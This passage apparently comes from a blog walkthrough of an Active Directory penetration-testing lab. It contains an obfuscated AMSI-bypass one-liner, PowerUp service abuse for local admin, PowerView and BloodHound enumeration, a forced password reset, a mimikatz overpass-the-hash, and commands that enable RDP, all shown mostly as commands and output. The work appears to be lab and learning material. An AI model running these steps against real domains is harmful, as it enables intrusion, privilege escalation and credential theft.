style="color:#f1fa8c">&#34;A`ss`Embly&#34;</span>.<span style="color:#f1fa8c">&#34;GET`TY`Pe&#34;</span><span style="color:#ff79c6">((</span> <span style="color:#f1fa8c">&#34;{6}{3}{1}{4}{2}{0}{5}&#34;</span> -f<span style="color:#f1fa8c">&#39;Util&#39;</span>,<span style="color:#f1fa8c">&#39;A&#39;</span>,<span style="color:#f1fa8c">&#39;Amsi&#39;</span>,<span style="color:#f1fa8c">&#39;.Management.&#39;</span>,<span style="color:#f1fa8c">&#39;utomation.&#39;</span>,<span style="color:#f1fa8c">&#39;s&#39;</span>,<span style="color:#f1fa8c">&#39;System&#39;</span> <span style="color:#ff79c6">))</span>.<span style="color:#f1fa8c">&#34;g`etf`iElD&#34;</span><span style="color:#ff79c6">(</span> <span style="color:#ff79c6">(</span> <span style="color:#f1fa8c">&#34;{0}{2}{1}&#34;</span> -f<span style="color:#f1fa8c">&#39;amsi&#39;</span>,<span style="color:#f1fa8c">&#39;d&#39;</span>,<span style="color:#f1fa8c">&#39;InitFaile&#39;</span> <span style="color:#ff79c6">)</span>,<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;{2}{4}{0}{1}{3}&#34;</span> -f <span style="color:#f1fa8c">&#39;Stat&#39;</span>,<span style="color:#f1fa8c">&#39;i&#39;</span>,<span style="color:#f1fa8c">&#39;NonPubli&#39;</span>,<span style="color:#f1fa8c">&#39;c&#39;</span>,<span style="color:#f1fa8c">&#39;c,&#39;</span> <span style="color:#ff79c6">))</span>.<span style="color:#f1fa8c">&#34;sE`T`VaLUE&#34;</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">n</span><span style="color:#f1fa8c">`</span>ULl<span style="color:#ff79c6">}</span>,<span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">t</span><span style="color:#f1fa8c">`</span>RuE<span style="color:#ff79c6">}</span> <span style="color:#ff79c6">)</span>
</span></span></code></pre></div><p>now i can run my own tools without interference.</p>
<p>next, let&rsquo;s change the execution policy.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Powershell -ep bypass
</span></span></code></pre></div><p>this launches PowerShell with the execution policy set to <code>bypass</code>. the execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files + runs scripts. by bypassing it, scripts can be run without restrictions.</p>
<p>i then used <code>PowerUp</code> to find vectors of privilege escalation. using it along with <code>Invoke-AllChecks</code> runs a series of checks to identify vectors like misconfigurations, vulnerable services, or unquoted service paths.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; .<span style="color:#f1fa8c">\P</span>owerUp.ps1
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Invoke-AllChecks
</span></span></code></pre></div><p>i get back an interesting piece of information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ServiceName : vds
</span></span><span style="display:flex;"><span>Path : C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\v</span>ds.exe
</span></span><span style="display:flex;"><span>StartName : LocalSystem
</span></span><span style="display:flex;"><span>AbuseFunction : Invoke-ServiceAbuse -Name <span style="color:#f1fa8c">&#39;vds&#39;</span>
</span></span><span style="display:flex;"><span>CanRestart : True
</span></span></code></pre></div><p>let&rsquo;s exploit this vulnerable service <code>VDS</code> to add our user <code>bilal</code> to the local Administrators group.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Invoke-ServiceAbuse -ServiceName vds -UserName Nebula<span style="color:#f1fa8c">\b</span>ilal
</span></span></code></pre></div><p>this exploits a vulnerability in <code>VDS</code> (Virtual Disk Service). it modifies the service to run a command [<code>net localgroup Administrators Nebula\bilal /add</code>] that will add my user to the Administrators group. this works because <code>VDS</code> runs with <code>SYSTEM</code> privileges.</p>
<p>logging back in so the changes take effect, i can verify:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; net localgroup Administrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--------------------------------------
</span></span><span style="display:flex;"><span>Administrator
</span></span><span style="display:flex;"><span>Nebula<span style="color:#f1fa8c">\D</span>omain Admins
</span></span><span style="display:flex;"><span>Nebula<span style="color:#f1fa8c">\b</span>ilal
</span></span></code></pre></div><h2 id="enumeration">enumeration</h2>
<p>get the list of domain users.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Get-NetUser | <span style="color:#ff79c6">select</span> samaccountname
</span></span></code></pre></div><p>get the list of domain computers.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Get-netcomputer
</span></span></code></pre></div><p>get the list of domain groups.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Get-netgroup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Administrators
</span></span><span style="display:flex;"><span>Users
</span></span><span style="display:flex;"><span>Guests
</span></span><span style="display:flex;"><span>Print Operators
</span></span><span style="display:flex;"><span>Backup Operators
</span></span><span style="display:flex;"><span>Replicator
</span></span><span style="display:flex;"><span>Remote Desktop Users
</span></span><span style="display:flex;"><span>Network Configuration Operators
</span></span><span style="display:flex;"><span>Performance Monitor Users
</span></span><span style="display:flex;"><span>Performance Log Users
</span></span><span style="display:flex;"><span>Distributed COM Users
</span></span><span style="display:flex;"><span>IIS_IUSRS
</span></span><span style="display:flex;"><span>Cryptographic Operators
</span></span><span style="display:flex;"><span>Event Log Readers
</span></span><span style="display:flex;"><span>Certificate Service DCOM Access
</span></span><span style="display:flex;"><span>RDS Remote Access Servers
</span></span><span style="display:flex;"><span>RDS Endpoint Servers
</span></span><span style="display:flex;"><span>RDS Management Servers
</span></span><span style="display:flex;"><span>Hyper-V Administrators
</span></span><span style="display:flex;"><span>Access Control Assistance Operators
</span></span><span style="display:flex;"><span>Remote Management Users
</span></span><span style="display:flex;"><span>System Managed Accounts Group
</span></span><span style="display:flex;"><span>Storage Replica Administrators
</span></span><span style="display:flex;"><span>Domain Computers
</span></span><span style="display:flex;"><span>Domain Controllers
</span></span><span style="display:flex;"><span>Cert Publishers
</span></span><span style="display:flex;"><span>Domain Admins
</span></span><span style="display:flex;"><span>Domain Users
</span></span><span style="display:flex;"><span>Domain Guests
</span></span><span style="display:flex;"><span>Group Policy Creator Owners
</span></span><span style="display:flex;"><span>RAS and IAS Servers
</span></span><span style="display:flex;"><span>Server Operators
</span></span><span style="display:flex;"><span>Account Operators
</span></span><span style="display:flex;"><span>Pre-Windows <span style="color:#bd93f9">2000</span> Compatible Access
</span></span><span style="display:flex;"><span>Windows Authorization Access Group
</span></span><span style="display:flex;"><span>Terminal Server License Servers
</span></span><span style="display:flex;"><span>Allowed RODC Password Replication Group
</span></span><span style="display:flex;"><span>Denied RODC Password Replication Group
</span></span><span style="display:flex;"><span>Read-only Domain Controllers
</span></span><span style="display:flex;"><span>Cloneable Domain Controllers
</span></span><span style="display:flex;"><span>Protected Users
</span></span><span style="display:flex;"><span>Key Admins
</span></span><span style="display:flex;"><span>DnsAdmins
</span></span><span style="display:flex;"><span>DnsUpdateProxy
</span></span><span style="display:flex;"><span>SQLManagers
</span></span></code></pre></div><p>check domain trusts.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Get-NetDomainTrust
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SourceName               TargetName    TrustType     TrustDirection
</span></span><span style="display:flex;"><span>-----------              -----------   ----------    ---------------
</span></span><span style="display:flex;"><span>Nebula.Cosmos.Local      Cosmos.Local  ParentChild   Bidirectional
</span></span></code></pre></div><p>before moving on, it&rsquo;s important to run <code>nslookup</code> on each machine in the environment to collect their IP addresses. it&rsquo;s also helpful to map out a graphical representation of the AD relationships, using BloodHound.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt;  <span style="color:#8be9fd;font-style:italic">cd</span> .<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master&gt; <span style="color:#8be9fd;font-style:italic">cd</span> .<span style="color:#f1fa8c">\I</span>ngestors<span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\I</span>ngestors&gt; . .<span style="color:#f1fa8c">\S</span>harpHound.ps1
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\I</span>ngestors&gt; Invoke-BloodHound -CollectionMethod All
</span></span><span style="display:flex;"><span>Initializing SharpHound at 10:49 PM on 7/3/2024
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Creating Schema map <span style="color:#ff79c6">for</span> domain NEBULA.COSMOS.LOCAL using path <span style="color:#8be9fd;font-style:italic">CN</span><span style="color:#ff79c6">=</span>Schema,CN<span style="color:#ff79c6">=</span>Configuration,DC<span style="color:#ff79c6">=</span>NEBULA,DC<span style="color:#ff79c6">=</span>COSMOS,DC<span style="color:#ff79c6">=</span>LOCAL
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\I</span>ngestors&gt; Invoke-BloodHound -CollectionMethod LoggedOn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Initializing SharpHound at 10:49 PM on 7/3/2024
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Status: <span style="color:#bd93f9">68</span> objects finished <span style="color:#ff79c6">(</span>+68 68<span style="color:#ff79c6">)</span>/s -- Using <span style="color:#bd93f9">103</span> MB RAM
</span></span><span style="display:flex;"><span>Resolved Collection Methods: LoggedOn451
</span></span><span style="display:flex;"><span>Compressing data to C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\I</span>ngestors<span style="color:#f1fa8c">\2</span>0210703224909_BloodHound.zip
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Creating Schema map <span style="color:#ff79c6">for</span> domain NEBULA.COSMOS.LOCAL using path <span style="color:#8be9fd;font-style:italic">CN</span><span style="color:#ff79c6">=</span>Schema,CN<span style="color:#ff79c6">=</span>Configuration,DC<span style="color:#ff79c6">=</span>NEBULA,DC<span style="color:#ff79c6">=</span>COSMOS,DC<span style="color:#ff79c6">=</span>LOCAL
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\I</span>ngestors&gt; <span style="color:#ff79c6">[</span>!<span style="color:#ff79c6">]</span> Cache File Found! Loaded <span style="color:#bd93f9">119</span> Objects in cache
</span></span><span style="display:flex;"><span>SharpHound Enumeration Completed at 10:49 PM on 7/3/2024! Happy Graphing!
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Pre-populating Domain Controller SIDS
</span></span><span style="display:flex;"><span>Status: <span style="color:#bd93f9">0</span> objects finished <span style="color:#ff79c6">(</span>+0<span style="color:#ff79c6">)</span> -- Using <span style="color:#bd93f9">104</span> MB RAM
</span></span><span style="display:flex;"><span>Status: <span style="color:#bd93f9">5</span> objects finished <span style="color:#ff79c6">(</span>+5 â<span style="color:#ff79c6">)</span>/s -- Using <span style="color:#bd93f9">105</span> MB RAM
</span></span><span style="display:flex;"><span>Enumeration finished in 00:00:00.1406833
</span></span><span style="display:flex;"><span>Compressing data to C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\B</span>loodHound-master<span style="color:#f1fa8c">\I</span>ngestors<span style="color:#f1fa8c">\2</span>0210703224919_BloodHound.zip
</span></span><span style="display:flex;"><span>You can upload this file directly to the UI
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SharpHound Enumeration Completed at 10:49 PM on 7/3/2024! Happy Graphing!
</span></span></code></pre></div><p>the <code>All</code> collection method would gather comprehensive data about the domain, while the <code>LoggedOn</code> method focuses on currently active sessions.</p>
<h1 id="target-2-leveraging-password-resets">target 2: leveraging password resets</h1>
<p>this machine represents a typical UAT server in an enterprise environment. UAT servers are used to test apps in an environment that closely mimic production, allowing users to verify that the software meets requirements before going live.</p>
<p>these servers often have looser security controls (compared to production systems). the challenge here is to exploit the delicate balance between functionality + security that UAT environments often struggle with.</p>
<p>it&rsquo;s clear that UAT servers are critical in the SDLC, but they&rsquo;re often overlooked from a security perspective. they may have elevated privileges to simulate various user roles, and their configurations might be less stringent to facilitate testing. this makes them valuable stepping stones for an attacker moving through a network.</p>
<p>earlier, running BloodHound revealed that the <code>bilal</code> user could force a password change for the <code>UATADMIN</code> user. let&rsquo;s exploit this using PowerView.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt;  Set-DomainUserPassword -Identity UATADMIN -Verbose
</span></span><span style="display:flex;"><span>cmdlet Set-DomainUserPassword at <span style="color:#8be9fd;font-style:italic">command</span> pipeline position <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>Supply values <span style="color:#ff79c6">for</span> the following parameters:
</span></span><span style="display:flex;"><span>AccountPassword: ********
</span></span><span style="display:flex;"><span>VERBOSE: <span style="color:#ff79c6">[</span>Set-DomainUserPassword<span style="color:#ff79c6">]</span> Attempting to <span style="color:#8be9fd;font-style:italic">set</span> the password <span style="color:#ff79c6">for</span> user <span style="color:#f1fa8c">&#39;UATADMIN&#39;</span>
</span></span><span style="display:flex;"><span>VERBOSE: <span style="color:#ff79c6">[</span>Set-DomainUserPassword<span style="color:#ff79c6">]</span> Password <span style="color:#ff79c6">for</span> user <span style="color:#f1fa8c">&#39;UATADMIN&#39;</span> successfully reset
</span></span></code></pre></div><p>this PowerView command allows me to forcibly change the password of another user&rsquo;s account. usually, this ability rests with IT for support purposes but can be a significant risk if not properly controlled. by changing the password, i can gain access to a more privileged account.</p>
<p>using mimikatz, i can perform an overpass-the-hash attack. this is when an attacker isn&rsquo;t able to access the cleartext password of a target, but can acquire a Kerberos ticket armed with just the NTLM hash of the password.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt;  Invoke-Mimikatz -Command <span style="color:#f1fa8c">&#34;sekurlsa::pth /user:uatadmin /domain:nebula.cosmos.local /ntlm:271B74BE505CD48CEF768D0D973E59E7 /run:powershell.exe&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.1.1 <span style="color:#ff79c6">(</span>x64<span style="color:#ff79c6">)</span> built on Nov <span style="color:#bd93f9">29</span> <span style="color:#bd93f9">2018</span> 12:37:56
</span></span><span style="display:flex;"><span> .## ^ <span style="color:#6272a4">##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo) ** Kitten Edition **</span>
</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
</span></span><span style="display:flex;"><span> <span style="color:#6272a4">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
</span></span><span style="display:flex;"><span> <span style="color:#f1fa8c">&#39;## v ##&#39;</span>       Vincent LE TOUX             <span style="color:#ff79c6">(</span> vincent.letoux@gmail.com <span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#39;#####&#39;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mimikatz<span style="color:#ff79c6">(</span>powershell<span style="color:#ff79c6">)</span> <span style="color:#6272a4"># sekurlsa::pth /user:uatadmin /domain:nebula.cosmos.local /ntlm:271B74BE505CD48CEF768D0D973E59E7 /run:powershell.exe</span>
</span></span><span style="display:flex;"><span>user    : uatadmin
</span></span><span style="display:flex;"><span>domain  : nebula.cosmos.local
</span></span><span style="display:flex;"><span>program : powershell.exe
</span></span><span style="display:flex;"><span>impers. : no
</span></span><span style="display:flex;"><span>NTLM    : 271b74be505cd48cef768d0d973e59e7
</span></span><span style="display:flex;"><span>  |  PID  <span style="color:#bd93f9">4428</span>
</span></span><span style="display:flex;"><span>  |  TID  <span style="color:#bd93f9">1292</span>
</span></span><span style="display:flex;"><span>  |  LSA Process is now R/W
</span></span><span style="display:flex;"><span>  |  LUID <span style="color:#bd93f9">0</span> ; <span style="color:#bd93f9">1820938</span> <span style="color:#ff79c6">(</span>00000000:001bc90a<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">\_</span> msv1_0   - data copy @ 0000026480392C00 : OK !
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">\_</span> kerberos - data copy @ <span style="color:#bd93f9">0000026480082500</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> aes256_hmac       -&gt; null
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> aes128_hmac       -&gt; null
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> rc4_hmac_nt       OK
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> rc4_hmac_old      OK
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> rc4_md4           OK
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> rc4_hmac_nt_exp   OK
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> rc4_hmac_old_exp  OK
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> *Password replace @ <span style="color:#bd93f9">0000026481000000</span> <span style="color:#ff79c6">(</span>32<span style="color:#ff79c6">)</span> -&gt; null
</span></span></code></pre></div><p>using the NTLM hash instead of the password to authenticate launches a new PowerShell process that runs with the <code>UATADMIN</code> credentials.</p>
<p>i can then add <code>bilal</code> to the local Administrators group on both the <code>UATADMIN</code> and <code>UATSRV</code> machines.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; <span style="color:#8be9fd;font-style:italic">$sess</span> <span style="color:#ff79c6">=</span> New-PSSession -ComputerName uatsrv.nebula.cosmos.local 
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; Enter-PSSession -Session <span style="color:#8be9fd;font-style:italic">$sess</span> <span style="color:#ff79c6">[</span>uatsrv.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\u</span>atadmin<span style="color:#f1fa8c">\D</span>ocuments&gt; net localgroup administrators /add nebula<span style="color:#f1fa8c">\b</span>ilal 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The <span style="color:#8be9fd;font-style:italic">command</span> completed successfully.
</span></span></code></pre></div><p>finally, let&rsquo;s enable RDP on the machine. i&rsquo;ll modify the Windows Registry to allow RDP connections, then enable the necessary firewall rule. this will give me GUI access to the machine, which could come in handy for further exploitation + exfiltration.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#ff79c6">[</span>uatsrv.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\u</span>atadmin<span style="color:#f1fa8c">\D</span>ocuments&gt; whoami;hostname nebula<span style="color:#f1fa8c">\u</span>atadmin
</span></span><span style="display:flex;"><span>uatsrv 
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>uatsrv.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\u</span>atadmin<span style="color:#f1fa8c">\D</span>ocuments&gt; Set-ItemProperty -Path <span style="color:#f1fa8c">&#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&#39;</span> -name <span style="color:#f1fa8c">&#34;fDenyTSConnections&#34;</span> -Value <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>uatsrv.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\u</span>atadmin<span style="color:#f1fa8c">\D</span>ocuments&gt; Enable-NetFirewallRule -DisplayGroup <span style="color:#f1fa8c">&#34;Remote Desktop&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>uatsrv.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\u</span>atadmin<span style="color:#f1fa8c">\D</span>ocuments&gt; netsh advfirewall firewall add rule <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;allow RemoteDesktop&#34;</span> <span style="color:#8be9fd;font-style:italic">dir</span><span style="color:#ff79c6">=</span>in <span style="color:#8be9fd;font-style:italic">protocol</span><span style="color:#ff79c6">=</span>TCP <span style="color:#8be9fd;font-style:italic">localport</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">3389</span> <span style="color:#8be9fd;font-style:italic">action</span><span style="color:#ff79c6">=</span>allow 
</span></span><span style="display:flex;"><span>Ok.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>uatsrv.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\u</span>atadmin<span style="color:#f1fa8c">\D</span>ocuments&gt; Test-NetConnection 172.16.10.1 -CommonTCPPort rdp
</span></span></code></pre></div><h1 id="target-3-sql-server-exploitation">target 3: sql server exploitation</h1>
<p>this is a dev server that hosts critical database services. dev servers are used by engineers to build + test apps before moving them to production.</p>
<p>these environments usually contain valuable intellectual property (code) and have direct connections to production systems. let&rsquo;s look for more information the SQL Server setup. you can do this with <code>PowerUpSQL.ps1</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\P</span>owerUpSQL-master&gt;Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Creating runspace pool and session states
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: devsrv.nebula.cosmos.local,1433 : Connection Success.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: USER : Connection Failed.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Closing the runspace pool
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ComputerName                    Instance                         Status
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>------------                    --------                         ------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>devsrv.nebula.cosmos.local      devsrv.nebula.cosmos.local,1433  Accessible
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>USER                             USER                            Not Accessible
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\P</span>owerUpSQL-master&gt; Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: devsrv.nebula.cosmos.local,1433 : Connection Success.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ComputerName : devsrv.nebula.cosmos.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Instance : DEVSRV
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DomainName : nebula
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ServiceProcessID : <span style="color:#bd93f9">2576</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ServiceName : MSSQLSERVER
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ServiceAccount : nebula<span style="color:#f1fa8c">\d</span>evsqladmin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>AuthenticationMode : Windows and SQL Server Authentication
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ForcedEncryption : <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Clustered : No
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SQLServerVersionNumber : 14.0.1000.169
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SQLServerMajorVersion : <span style="color:#bd93f9">2017</span>
</span></span><span style="display:flex;"><span>
